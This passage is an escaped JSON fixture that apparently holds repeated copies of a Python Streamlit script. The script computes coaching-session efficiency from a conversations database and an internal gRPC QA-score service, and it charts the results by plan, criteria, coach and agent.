   agent_user_name = f'customers/{customer[\\\\\\"customer_id\\\\\\"]}/users/{agent_user_id}'\\\\n    try:\\\\n        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(\\\\n            parent=parent,\\\\n            read_from_clickhouse=True,\\\\n            filter_by_time_range=common_pb2.TimeRange(\\\\n                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),\\\\n                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),\\\\n            ),\\\\n            filter_by_attribute=qa_stats_pb2.QAAttribute(\\\\n                    users=[user_pb2.User(name=agent_user_name)],\\\\n                    criterion_identifiers=[criteria_id],\\\\n                ),\\\\n            group_by_attribute_types=[\\\\n                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,\\\\n            ],\\\\n        )\\\\n        response = _stub.RetrieveQAScoreStats(\\\\n            request,\\\\n            metadata=auth_metadata,\\\\n            timeout=600)\\\\n    except Exception as e:\\\\n        print(f'Error querying Insights Server: {e}')\\\\n        return None\\\\n    if response.qa_score_result.total_conversation_count == 0:\\\\n        return -1, 0\\\\n    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count\\\\n\\\\n\\\\n##############################################################################################\\\\n\\\\ncustomer_display_name = st.selectbox(\\\\n    'Select a customer:',\\\\n    [c['display_name'] for c in all_customers])\\\\n\\\\nnum_last_days = st.number_input(\\\\\\"How many days back to load the session notes?\\\\\\", min_value=7, max_value=180, value=30, step=1)\\\\n\\\\nnum_days = st.number_input(\\\\\\"How many days to measure the session efficiency?\\\\\\", min_value=1, max_value=30, value=7, step=1)\\\\n\\\\ncoaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)\\\\n\\\\ncoaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)\\\\n\\\\nwith st.expander(\\\\\\"All loaded session notes\\\\\\", expanded=True):\\\\n    st.write(f\\\\\\"Loaded {len(coaching_sessions)} coaching sessions in total\\\\\\")\\\\n    session_df = pd.DataFrame(coaching_sessions)\\\\n    st.dataframe(session_df)\\\\n    st.write(f\\\\\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\\\\\")\\\\n    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers\\\\n\\\\nwith st.expander(\\\\\\"Session notes with valid scores\\\\\\", expanded=True):\\\\n    # Coach efficiency chart.\\\\n    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()\\\\n    st.dataframe(valid_session_df)\\\\n \\\\n    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']\\\\n    st.write(f\\\\\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\\\\\")\\\\n    st.write(f\\\\\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\\\\\")\\\\n\\\\ndef weighted_effiency(df):\\\\n    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()\\\\n    num_sessions =  len(df['session_id'].unique())\\\\n    return pd.Series({\\\\n        'efficiency': efficiency,\\\\n        'num_sessions': num_sessions\\\\n    })\\\\n\\\\nwith st.expander(\\\\\\"Session efficiency\\\\\\", expanded=True):\\\\n    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()\\\\n    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(session_efficiency_df)\\\\n    fig = px.histogram(session_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Coaching plan efficiency\\\\\\", expanded=True):\\\\n    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()\\\\n    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(plan_efficiency_df)\\\\n    fig = px.histogram(plan_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Focus criteria efficiency\\\\\\", expanded=True):\\\\n    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()\\\\n    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(criteria_efficiency_df)\\\\n    fig = px.histogram(criteria_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Focus scorecard template efficiency\\\\\\", expanded=True):\\\\n    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()\\\\n    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(template_efficiency_df)\\\\n    fig = px.histogram(template_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Coach efficiency\\\\\\", expanded=True):\\\\n    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()\\\\n    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(coach_efficiency_df)\\\\n    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\\\n\\\\nwith st.expander(\\\\\\"Agent efficiency\\\\\\", expanded=True):\\\\n    # Agent efficiency chart.\\\\n    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()\\\\n    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(agent_efficiency_df)\\\\n    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\\\n\\",\\"originalContents\\":\\"export const mockFile = \`downloadFileimport argparse\\\\nimport collections\\\\nimport datetime\\\\nimport grpc\\\\nimport itertools\\\\nimport numpy as np\\\\nimport os\\\\nimport pandas as pd\\\\nimport pandas.io.sql as sqlio\\\\nimport subprocess\\\\nimport time\\\\nimport streamlit as st\\\\nfrom collections import defaultdict\\\\nimport plotly.express as px\\\\n\\\\nfrom google.protobuf import timestamp_pb2\\\\n\\\\nfrom cresta.v1.analytics import analytics_service_pb2\\\\nfrom cresta.v1.analytics import analytics_service_pb2_grpc\\\\nfrom cresta.v1.analytics import common_pb2\\\\nfrom cresta.v1.analytics import qa_stats_pb2\\\\nfrom cresta.v1.user import user_pb2\\\\n\\\\nfrom greyparrot.common import Customer\\\\nfrom greyparrot.conversations.db import ConversationsDBConn\\\\n\\\\nst.write(\\\\\\"\\\\\\"\\\\\\"# Coaching Report #\\\\\\"\\\\\\"\\\\\\")\\\\n\\\\nport_forward_ports_and_processes = {\\\\n    'chat-prod': (8081, None),\\\\n    'voice-prod': (8082, None),\\\\n    'us-west-2-prod': (8083, None),\\\\n}\\\\n\\\\nall_customers = [{\\\\n    'display_name': f'{display_name} ({customer_name})',\\\\n    'name': customer_name,\\\\n    'customer_id': customer_id,\\\\n    'profile_id': profile_id,\\\\n    'prod_env_name': prod_env_name,\\\\n    'domain': domain,\\\\n} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(\\\\n    list(\\\\n        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,\\\\n             c.prod_env_name, c.domain) for c in Customer.all()\\\\n            if c.prod_env_name in port_forward_ports_and_processes.keys())))]\\\\n\\\\ndef build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):\\\\n    return f\\\\\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\\\\\"\\\\n\\\\n@st.cache_data\\\\ndef load_coaching_data(customer_display_name, num_last_days, num_days):\\\\n    if not customer_display_name:\\\\n        return None\\\\n\\\\n    current_datetime = datetime.datetime.now(datetime.timezone.utc)\\\\n    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)\\\\n    last_session_days = current_datetime - datetime.timedelta(days=num_days)\\\\n\\\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\\\n\\\\n    db_conn = ConversationsDBConn.from_customer_name(customer['name'])\\\\n    conn = db_conn.session.connection().connection\\\\n\\\\n    user_id_name = {}\\\\n    scorecard_template_id_name_map = {}\\\\n    template_criteria_id_name_map = {}\\\\n    coaching_sessions = []\\\\n\\\\n    with conn.cursor() as cursor:\\\\n        cursor.execute(f\\\\\\"\\\\\\"\\\\\\"\\\\n            SELECT\\\\n                coaching_plans.resource_id as coaching_plan_id,\\\\n                cu.full_name as creator_user_name,\\\\n                cu.user_id as creator_user_id,\\\\n                COALESCE(su.full_name, '') as submitter_user_name,\\\\n                COALESCE(su.user_id, '') as submitter_user_id,\\\\n                coaching_sessions.session_at as session_time,\\\\n                coaching_plans.focus_criteria_ids as focus_behaviors,\\\\n                au.full_name as agent_user_name,\\\\n                au.user_id as agent_user_id,\\\\n                coaching_sessions.resource_id as session_id,\\\\n                coaching_sessions.usecase_id as usecase\\\\n            FROM director.coaching_plans \\\\n                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id\\\\n                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id\\\\n                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id\\\\n                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id\\\\n            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\\\\\"%Y-%m-%d\\\\\\")}'\\\\n                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\\\\\"%Y-%m-%d\\\\\\")}'\\\\n            \\\\\\"\\\\\\"\\\\\\")\\\\n        \\\\n        rows = cursor.fetchall()\\\\n        for session_note in rows:\\\\n            if session_note[6] is not None and len(session_note[6]) > 0:\\\\n                focus_criteria = session_note[6]\\\\n                for criteria in focus_criteria:\\\\n                    ids = criteria.split('/')\\\\n                    scorecard_template_id_name_map[ids[0]] = ''\\\\n                    coaching_sessions.append({\\\\n                        \\\\\\"session_id\\\\\\": session_note[9],\\\\n                        \\\\\\"usecase\\\\\\": session_note[10],\\\\n                        \\\\\\"coaching_plan_id\\\\\\": session_note[0],\\\\n                        \\\\\\"coaching_plan_url\\\\\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\\\n                        \\\\\\"creator_user_name\\\\\\": session_note[1],\\\\n                        \\\\\\"creator_user_id\\\\\\": session_note[2],\\\\n                        \\\\\\"submitter_user_name\\\\\\": session_note[3],\\\\n                        \\\\\\"submitter_user_id\\\\\\": session_note[4],\\\\n                        \\\\\\"session_time\\\\\\": session_note[5],\\\\n                        \\\\\\"focus_criteria_template_id\\\\\\": ids[0],\\\\n                        \\\\\\"focus_criteria_id\\\\\\": ids[1],\\\\n                        \\\\\\"agent_user_name\\\\\\": session_note[7],\\\\n                        \\\\\\"agent_user_id\\\\\\": session_note[8],\\\\n                        \\\\\\"before_score\\\\\\": -1,\\\\n                        \\\\\\"before_convo_count\\\\\\": 0,\\\\n                        \\\\\\"after_score\\\\\\": -1,\\\\n                        \\\\\\"after_convo_count\\\\\\": 0,\\\\n                    })\\\\n            else:\\\\n                coaching_sessions.append({\\\\n                    \\\\\\"session_id\\\\\\": session_note[9],\\\\n                    \\\\\\"coaching_plan_id\\\\\\": session_note[0],\\\\n                    \\\\\\"coaching_plan_url\\\\\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\\\n                    \\\\\\"creator_user_name\\\\\\": session_note[1],\\\\n                    \\\\\\"creator_user_id\\\\\\": session_note[2],\\\\n                    \\\\\\"submitter_user_name\\\\\\": session_note[3],\\\\n                    \\\\\\"submitter_user_id\\\\\\": session_note[4],\\\\n                    \\\\\\"session_time\\\\\\": session_note[5],\\\\n                    \\\\\\"focus_criteria_template_id\\\\\\": '',\\\\n                    \\\\\\"focus_criteria_id\\\\\\": '',\\\\n                    \\\\\\"agent_user_name\\\\\\": session_note[7],\\\\n                    \\\\\\"agent_user_id\\\\\\": session_note[8],\\\\n                    \\\\\\"before_score\\\\\\": -1,\\\\n                    \\\\\\"before_convo_count\\\\\\": 0,\\\\n                    \\\\\\"after_score\\\\\\": -1,\\\\n                    \\\\\\"after_convo_count\\\\\\": 0,\\\\n                })\\\\n            user_id_name[session_note[2]] = session_note[1]\\\\n            user_id_name[session_note[4]] = session_note[3]\\\\n            user_id_name[session_note[8]] = session_note[7]\\\\n\\\\n    if len(scorecard_template_id_name_map) == 0:\\\\n        return coaching_sessions\\\\n\\\\n    with conn.cursor() as cursor:\\\\n        cursor.execute(f\\\\\\"\\\\\\"\\\\\\"\\\\n            SELECT\\\\n                resource_id as scorecard_template_id,\\\\n                title as title,\\\\n                template as template\\\\n            FROM director.scorecard_templates \\\\n            WHERE resource_id IN ('{\\\\\\"','\\\\\\".join(scorecard_template_id_name_map.keys())}')\\\\n            \\\\\\"\\\\\\"\\\\\\")\\\\n        \\\\n        rows = cursor.fetchall()\\\\n        for template in rows:\\\\n            scorecard_template_id_name_map[template[0]] = template[1]\\\\n            for items in template[2].get('items', []):\\\\n                if 'identifier' in items and 'displayName' in items:\\\\n                    template_criteria_id_name_map[items['identifier']] = items['displayName']\\\\n                if 'items' in items:\\\\n                    for criteria_items in items['items']:\\\\n                        if 'identifier' in criteria_items and 'displayName' in criteria_items:\\\\n                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']\\\\n\\\\n        for session in coaching_sessions:\\\\n            if session['focus_criteria_template_id'] != '':\\\\n                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]\\\\n            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:\\\\n                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]\\\\n        \\\\n    return coaching_sessions\\\\n\\\\n\\\\ndef load_scores_data(customer_display_name, coaching_sessions, num_days):\\\\n    if not coaching_sessions:\\\\n        return None\\\\n\\\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\\\n\\\\n    progress = st.progress(0, text=\\\\\\"Computing the coaching efficiency of the session notes...\\\\\\")\\\\n\\\\n    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]\\\\n    if port_forward_process is None or port_forward_process.poll() is not None:\\\\n        process = subprocess.Popen([\\\\n            'kubectl',\\\\n            f'--context={customer[\\\\\\"prod_env_name\\\\\\"]}',\\\\n            '--namespace=cresta-api',\\\\n            'port-forward',\\\\n            'services/insights-server',\\\\n            f'{port_number}:80',\\\\n        ])\\\\n        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)\\\\n        time.sleep(2)\\\\n\\\\n    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')\\\\n    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'\\\\n    auth_metadata = [['authorization', f'ApiKey {api_key}']]\\\\n\\\\n    with grpc.insecure_channel(\\\\n            f'localhost:{port_number}',\\\\n            options=[\\\\n                ('grpc.max_receive_message_length', 50000000),\\\\n            ],\\\\n    ) as channel:\\\\n        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)\\\\n        for coaching_session_idx in range(len(coaching_sessions)):\\\\n            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\\\\\"Computing the coaching efficiency of the session notes...\\\\\\")\\\\n            coaching_session = coaching_sessions[coaching_session_idx]\\\\n            if coaching_session['focus_criteria_id'] != '':\\\\n                before_score, before_convo_count = query_agent_criteria_score(\\\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])\\\\n                after_score, after_convo_count = query_agent_criteria_score(\\\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))\\\\n                coaching_session['before_score'] = before_score\\\\n                coaching_session['before_convo_count'] = before_convo_count\\\\n                coaching_session['after_score'] = after_score\\\\n                coaching_session['after_convo_count'] = after_convo_count\\\\n\\\\n    progress.empty()\\\\n    return coaching_sessions\\\\n\\\\n@st.cache_data\\\\ndef query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):\\\\n    parent = f'customers/{customer[\\\\\\"customer_id\\\\\\"]}/profiles/{customer[\\\\\\"profile_id\\\\\\"]}'\\\\n    agent_user_name = f'customers/{customer[\\\\\\"customer_id\\\\\\"]}/users/{agent_user_id}'\\\\n    try:\\\\n        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(\\\\n            parent=parent,\\\\n            read_from_clickhouse=True,\\\\n            filter_by_time_range=common_pb2.TimeRange(\\\\n                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),\\\\n                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),\\\\n            ),\\\\n            filter_by_attribute=qa_stats_pb2.QAAttribute(\\\\n                    users=[user_pb2.User(name=agent_user_name)],\\\\n                    criterion_identifiers=[criteria_id],\\\\n                ),\\\\n            group_by_attribute_types=[\\\\n                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,\\\\n            ],\\\\n        )\\\\n        response = _stub.RetrieveQAScoreStats(\\\\n            request,\\\\n            metadata=auth_metadata,\\\\n            timeout=600)\\\\n    except Exception as e:\\\\n        print(f'Error querying Insights Server: {e}')\\\\n        return None\\\\n    if response.qa_score_result.total_conversation_count == 0:\\\\n        return -1, 0\\\\n    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count\\\\n\\\\n\\\\n##############################################################################################\\\\n\\\\ncustomer_display_name = st.selectbox(\\\\n    'Select a customer:',\\\\n    [c['display_name'] for c in all_customers])\\\\n\\\\nnum_last_days = st.number_input(\\\\\\"How many days back to load the session notes?\\\\\\", min_value=7, max_value=180, value=30, step=1)\\\\n\\\\nnum_days = st.number_input(\\\\\\"How many days to measure the session efficiency?\\\\\\", min_value=1, max_value=30, value=7, step=1)\\\\n\\\\ncoaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)\\\\n\\\\ncoaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)\\\\n\\\\nwith st.expander(\\\\\\"All loaded session notes\\\\\\", expanded=True):\\\\n    st.write(f\\\\\\"Loaded {len(coaching_sessions)} coaching sessions in total\\\\\\")\\\\n    session_df = pd.DataFrame(coaching_sessions)\\\\n    st.dataframe(session_df)\\\\n    st.write(f\\\\\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\\\\\")\\\\n    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers\\\\n\\\\nwith st.expander(\\\\\\"Session notes with valid scores\\\\\\", expanded=True):\\\\n    # Coach efficiency chart.\\\\n    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()\\\\n    st.dataframe(valid_session_df)\\\\n \\\\n    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']\\\\n    st.write(f\\\\\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\\\\\")\\\\n    st.write(f\\\\\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\\\\\")\\\\n\\\\ndef weighted_effiency(df):\\\\n    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()\\\\n    num_sessions =  len(df['session_id'].unique())\\\\n    return pd.Series({\\\\n        'efficiency': efficiency,\\\\n        'num_sessions': num_sessions\\\\n    })\\\\n\\\\nwith st.expander(\\\\\\"Session efficiency\\\\\\", expanded=True):\\\\n    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()\\\\n    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(session_efficiency_df)\\\\n    fig = px.histogram(session_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Coaching plan efficiency\\\\\\", expanded=True):\\\\n    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()\\\\n    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(plan_efficiency_df)\\\\n    fig = px.histogram(plan_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Focus criteria efficiency\\\\\\", expanded=True):\\\\n    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()\\\\n    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(criteria_efficiency_df)\\\\n    fig = px.histogram(criteria_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Focus scorecard template efficiency\\\\\\", expanded=True):\\\\n    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()\\\\n    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(template_efficiency_df)\\\\n    fig = px.histogram(template_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\\\n    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\\\n\\\\nwith st.expander(\\\\\\"Coach efficiency\\\\\\", expanded=True):\\\\n    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()\\\\n    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(coach_efficiency_df)\\\\n    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\\\n\\\\nwith st.expander(\\\\\\"Agent efficiency\\\\\\", expanded=True):\\\\n    # Agent efficiency chart.\\\\n    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()\\\\n    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']\\\\n    st.dataframe(agent_efficiency_df)\\\\n    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"export const mockFile = \`downloadFileimport argparse\\",\\"lineNumber\\":1},{\\"text\\":\\"import collections\\",\\"lineNumber\\":2},{\\"text\\":\\"import datetime\\",\\"lineNumber\\":3},{\\"text\\":\\"import grpc\\",\\"lineNumber\\":4},{\\"text\\":\\"import itertools\\",\\"lineNumber\\":5},{\\"text\\":\\"import numpy as np\\",\\"lineNumber\\":6},{\\"text\\":\\"import os\\",\\"lineNumber\\":7},{\\"text\\":\\"import pandas as pd\\",\\"lineNumber\\":8},{\\"text\\":\\"import pandas.io.sql as sqlio\\",\\"lineNumber\\":9},{\\"text\\":\\"import subprocess\\",\\"lineNumber\\":10},{\\"text\\":\\"import time\\",\\"lineNumber\\":11},{\\"text\\":\\"import streamlit as st\\",\\"lineNumber\\":12},{\\"text\\":\\"from collections import defaultdict\\",\\"lineNumber\\":13},{\\"text\\":\\"import plotly.express as px\\",\\"lineNumber\\":14},{\\"lineNumber\\":15},{\\"text\\":\\"from google.protobuf import timestamp_pb2\\",\\"lineNumber\\":16},{\\"lineNumber\\":17},{\\"text\\":\\"from cresta.v1.analytics import analytics_service_pb2\\",\\"lineNumber\\":18},{\\"text\\":\\"from cresta.v1.analytics import analytics_service_pb2_grpc\\",\\"lineNumber\\":19},{\\"text\\":\\"from cresta.v1.analytics import common_pb2\\",\\"lineNumber\\":20},{\\"text\\":\\"from cresta.v1.analytics import qa_stats_pb2\\",\\"lineNumber\\":21},{\\"text\\":\\"from cresta.v1.user import user_pb2\\",\\"lineNumber\\":22},{\\"lineNumber\\":23},{\\"text\\":\\"from greyparrot.common import Customer\\",\\"lineNumber\\":24},{\\"text\\":\\"from greyparrot.conversations.db import ConversationsDBConn\\",\\"lineNumber\\":25},{\\"lineNumber\\":26},{\\"text\\":\\"st.write(\\\\\\"\\\\\\"\\\\\\"# Coaching Report #\\\\\\"\\\\\\"\\\\\\")\\",\\"lineNumber\\":27},{\\"lineNumber\\":28},{\\"text\\":\\"port_forward_ports_and_processes = {\\",\\"lineNumber\\":29},{\\"text\\":\\"    'chat-prod': (8081, None),\\",\\"lineNumber\\":30},{\\"text\\":\\"    'voice-prod': (8082, None),\\",\\"lineNumber\\":31},{\\"text\\":\\"    'us-west-2-prod': (8083, None),\\",\\"lineNumber\\":32},{\\"text\\":\\"}\\",\\"lineNumber\\":33},{\\"lineNumber\\":34},{\\"text\\":\\"all_customers = [{\\",\\"lineNumber\\":35},{\\"text\\":\\"    'display_name': f'{display_name} ({customer_name})',\\",\\"lineNumber\\":36},{\\"text\\":\\"    'name': customer_name,\\",\\"lineNumber\\":37},{\\"text\\":\\"    'customer_id': customer_id,\\",\\"lineNumber\\":38},{\\"text\\":\\"    'profile_id': profile_id,\\",\\"lineNumber\\":39},{\\"text\\":\\"    'prod_env_name': prod_env_name,\\",\\"lineNumber\\":40},{\\"text\\":\\"    'domain': domain,\\",\\"lineNumber\\":41},{\\"text\\":\\"} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(\\",\\"lineNumber\\":42},{\\"text\\":\\"    list(\\",\\"lineNumber\\":43},{\\"text\\":\\"        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,\\",\\"lineNumber\\":44},{\\"text\\":\\"             c.prod_env_name, c.domain) for c in Customer.all()\\",\\"lineNumber\\":45},{\\"text\\":\\"            if c.prod_env_name in port_forward_ports_and_processes.keys())))]\\",\\"lineNumber\\":46},{\\"lineNumber\\":47},{\\"text\\":\\"def build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):\\",\\"lineNumber\\":48},{\\"text\\":\\"    return f\\\\\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\\\\\"\\",\\"lineNumber\\":49},{\\"lineNumber\\":50},{\\"text\\":\\"@st.cache_data\\",\\"lineNumber\\":51},{\\"text\\":\\"def load_coaching_data(customer_display_name, num_last_days, num_days):\\",\\"lineNumber\\":52},{\\"text\\":\\"    if not customer_display_name:\\",\\"lineNumber\\":53},{\\"text\\":\\"        return None\\",\\"lineNumber\\":54},{\\"lineNumber\\":55},{\\"text\\":\\"    current_datetime = datetime.datetime.now(datetime.timezone.utc)\\",\\"lineNumber\\":56},{\\"text\\":\\"    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)\\",\\"lineNumber\\":57},{\\"text\\":\\"    last_session_days = current_datetime - datetime.timedelta(days=num_days)\\",\\"lineNumber\\":58},{\\"lineNumber\\":59},{\\"text\\":\\"    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\",\\"lineNumber\\":60},{\\"lineNumber\\":61},{\\"text\\":\\"    db_conn = ConversationsDBConn.from_customer_name(customer['name'])\\",\\"lineNumber\\":62},{\\"text\\":\\"    conn = db_conn.session.connection().connection\\",\\"lineNumber\\":63},{\\"lineNumber\\":64},{\\"text\\":\\"    user_id_name = {}\\",\\"lineNumber\\":65},{\\"text\\":\\"    scorecard_template_id_name_map = {}\\",\\"lineNumber\\":66},{\\"text\\":\\"    template_criteria_id_name_map = {}\\",\\"lineNumber\\":67},{\\"text\\":\\"    coaching_sessions = []\\",\\"lineNumber\\":68},{\\"lineNumber\\":69},{\\"text\\":\\"    with conn.cursor() as cursor:\\",\\"lineNumber\\":70},{\\"text\\":\\"        cursor.execute(f\\\\\\"\\\\\\"\\\\\\"\\",\\"lineNumber\\":71},{\\"text\\":\\"            SELECT\\",\\"lineNumber\\":72},{\\"text\\":\\"                coaching_plans.resource_id as coaching_plan_id,\\",\\"lineNumber\\":73},{\\"text\\":\\"                cu.full_name as creator_user_name,\\",\\"lineNumber\\":74},{\\"text\\":\\"                cu.user_id as creator_user_id,\\",\\"lineNumber\\":75},{\\"text\\":\\"                COALESCE(su.full_name, '') as submitter_user_name,\\",\\"lineNumber\\":76},{\\"text\\":\\"                COALESCE(su.user_id, '') as submitter_user_id,\\",\\"lineNumber\\":77},{\\"text\\":\\"                coaching_sessions.session_at as session_time,\\",\\"lineNumber\\":78},{\\"text\\":\\"                coaching_plans.focus_criteria_ids as focus_behaviors,\\",\\"lineNumber\\":79},{\\"text\\":\\"                au.full_name as agent_user_name,\\",\\"lineNumber\\":80},{\\"text\\":\\"                au.user_id as agent_user_id,\\",\\"lineNumber\\":81},{\\"text\\":\\"                coaching_sessions.resource_id as session_id,\\",\\"lineNumber\\":82},{\\"text\\":\\"                coaching_sessions.usecase_id as usecase\\",\\"lineNumber\\":83},{\\"text\\":\\"            FROM director.coaching_plans \\",\\"lineNumber\\":84},{\\"text\\":\\"                JOIN director.coaching_sessions ON coaching_plans.resource_id = 